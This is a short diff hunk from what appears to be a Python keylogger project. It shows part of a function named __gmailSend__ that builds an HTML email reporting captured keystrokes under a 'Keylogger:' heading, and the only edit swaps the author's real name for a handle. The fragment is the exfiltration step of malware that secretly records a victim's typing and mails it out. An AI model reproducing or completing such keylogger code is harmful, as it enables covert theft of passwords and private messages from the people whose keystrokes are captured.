@@ -41,7 +41,7 @@ def __gmailSend__(credentials = {
     html = f"""
     <html>
     <body>
-    <h1>Author: ADRÍAN LUJÁN MUÑOZ</h1>
+    <h1>Author: @clhore</h1>
     <h2>Keylogger: </h2> 
     <h3>{keys}</h3><br>
     </body>
